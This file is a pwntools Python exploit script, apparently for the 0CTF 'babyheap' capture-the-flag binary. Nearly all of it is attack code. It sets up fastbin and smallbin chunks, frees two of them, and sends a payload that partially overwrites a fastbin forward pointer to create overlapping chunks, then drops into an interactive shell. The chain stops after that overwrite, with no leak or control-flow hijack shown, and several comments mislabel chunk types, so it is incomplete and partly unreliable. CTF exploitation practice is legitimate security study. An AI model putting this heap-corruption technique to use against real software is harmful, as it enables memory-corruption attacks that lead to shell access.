from pwn import *
import sys 

context(terminal=['terminator', '-e'])
context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./0ctfbabyheap.dms', env={"LD_PRELOAD":"./libc.so.6"})
	gdb.attach(p, "b main")
elif sys.argv[1] == "live":
	p = process('./0ctfbabyheap.dms', env={"LD_PRELOAD":"./libc.so.6"})
else:
	print("[!] Invalid option")
	sys.exit(1)

def allocate(size):
	log.info("Allocating Size: " + str(size))
	p.sendline('1')
	p.sendlineafter(': ', str(size))
	p.recvuntil(': ', timeout=1)

def free(idx):
	log.info("Freeing: " + str(idx))
	p.sendline('3')
	p.sendlineafter(': ', str(idx))
	p.recvuntil(': ')

def dump(idx):
	log.info("Dumping: " + str(idx))
	p.sendline('4')
	p.sendlineafter(': ', str(idx))
	p.recvuntil(': \n')
	data = p.recvline()
	p.recvuntil(': ')
	return data

def fill(idx, data):
	log.info("Filling: " + str(idx))
	p.sendline('2')
	p.sendlineafter(': ', str(idx))
	p.sendlineafter(': ', str(len(data)))
	p.sendafter(': ', data)
	p.recvuntil(': ')

def interact():
	log.success("Popping Shell")
	p.interactive()

def exploit():

	log.success("Sending Exploit...")

	p.recvuntil(": ")

	log.info("Setting up the heap...")

	allocate(0x80) # fast bin
	chunk = "1" * 16
	fill(0,chunk)

	allocate(0x500) # smallbin
	chunk = "2" * 16
	fill(1,chunk)

	allocate(0x80) # fast bin
	chunk = "3" * 16
	fill(2,chunk)

	allocate(0x500) # fast bin
	chunk = "4" * 16
	fill(3,chunk)

	allocate(0x80) # fast bin
	chunk = "5" * 16
	fill(2,chunk)

	free(1) # free fast bin
	free(3) # free fast bin # this is now the top of the fastbin free list

	log.info("Performing partial overwrite on fastbin chunk...")

	payload  = p64(0x41)*5
	payload += p64(0x31)
	payload += p64(0x42)*5
	payload += p64(0x31)
	payload += p8(0xc0)
	fill(0, payload) # partial overwrite of fastbin->FD with \xc0 (location of smallbin) (overlapping chunks)

	interact() # interactive 

exploit()